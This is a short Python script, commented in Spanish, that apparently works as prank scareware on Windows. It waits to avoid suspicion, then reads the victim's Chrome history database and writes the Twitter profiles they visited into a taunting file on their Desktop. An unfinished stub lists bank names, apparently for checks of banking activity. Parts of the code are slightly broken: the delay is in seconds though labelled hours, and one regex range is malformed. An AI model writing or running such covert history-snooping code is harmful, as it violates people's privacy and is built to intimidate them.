import os
from pathlib import Path
import sqlite3
from time import sleep
from random import randrange
import re
HFILENAME= "PARA TI.txt"

def get_user_path():
    return "{}/".format(Path.home()) 
def delay_action():
    n_hours = randrange(1,4)
    print("Durmiendo {} horas".format(n_hours))
    sleep(n_hours)

def create_hacker_file(user_path):
    hacker_file = open(user_path+"/Desktop/" + HFILENAME, "w")
    hacker_file.write("Hola, soy un dibujo de la beba army xd y me colado en tu sistema.\n")
    return hacker_file
def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path+"/AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor=connection.cursor()
            cursor.execute("SELECT title ,last_visit_time, url FROM  urls ORDER BY last_visit_time DESC")
            urls= cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible reintentando en 3 seg..")
            sleep(3)
def check_history_and_scare_user(hacker_file, chrome_history):
    profiles_visited=[]
    for item in chrome_history:
        resultst =  re.findall("https://twitter.com/([A-za-z0-9]+)$", item[2])
        if resultst and resultst[0] not in ["notifications", "home"]:
            profiles_visited.append(resultst[0])

    hacker_file.write("He visto que has estado husmeando en los perfiles de {}..".format(".\n".join(profiles_visited)))

def check_banc_account(hacker_file, chrome_history):
    bancs = ["bbva", "interbanc", "bcp"]
def main():
    # esperaremos entre 1 y 3 horas para no levantar sospechas xd
    delay_action()
    #calculamos la ruta del usuario de windows
    user_path = get_user_path()
    #creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    #recogemos su historial de googlechrome cuando este disponible
    chrome_histoy=get_chrome_history(user_path)
    #tecleandosuhistorial
    check_history_and_scare_user(hacker_file, chrome_histoy)
if __name__=="__main__":
    main()